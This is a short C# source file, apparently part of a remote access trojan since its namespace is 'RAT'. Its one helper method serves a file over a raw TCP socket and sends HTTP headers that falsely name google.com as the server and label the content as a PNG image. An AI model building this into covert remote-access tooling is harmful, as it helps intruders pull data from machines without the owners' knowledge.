using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace RAT
{
    static class NetworkHelper
    {
        public static void HostImage(string path, Action<string> log,int port)
        {
            string responseHeaders =
                "HTTP/1.1 200 OK\r\n" +
                "Server: google.com\r\n" +
                "Content-Length: " + new FileInfo(path).Length + "\r\n" +
                "Content-Type: image/png\r\n" +
                "Content-Disposition: inline;filename=\"image.png;\"\r\n" +
                "\r\n";

            //headers should ALWAYS be ascii. Never UTF8
            var headerBytes = Encoding.ASCII.GetBytes(responseHeaders);

            var lstr = new TcpListener(IPAddress.Any, port);
            lstr.Start();
            log("Waiting for client to connect...");
            var webSocket = lstr.AcceptSocket();

            webSocket.Send(headerBytes);
            webSocket.SendFile(path);
            webSocket.Close();
            lstr.Stop();
        }
    }
}
